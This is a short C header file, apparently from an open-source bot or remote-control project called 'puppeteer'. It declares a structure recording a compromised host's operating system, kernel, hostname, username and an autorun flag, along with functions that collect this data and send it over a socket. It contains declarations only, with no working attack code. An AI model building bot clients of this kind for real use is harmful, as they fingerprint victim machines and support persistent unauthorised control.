// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 * This file contains struct declaration for:
 *      struc bot:  structure to store bot informations like architecture and OS
 *
 * This file contains function declarations for:
 *      get_info(char *, char *, char*, char*): gets the infos as strings
 *      send_info(int16_t): send the bot info over socket
 */
#ifndef INFORMATION_H
#define INFORMATION_H

#include <stdint.h>

typedef struct host {
    char    op_system[15];
    char    architecture[15];
    char    kernel_release[30];
    char    hostname[20];
    char    username[20];
    uint8_t autorun_enabled;

} host_t;

host_t
get_host_info(void);

void
send_host_info(int16_t socket_fd, host_t host);

#endif // INFORMATION_H
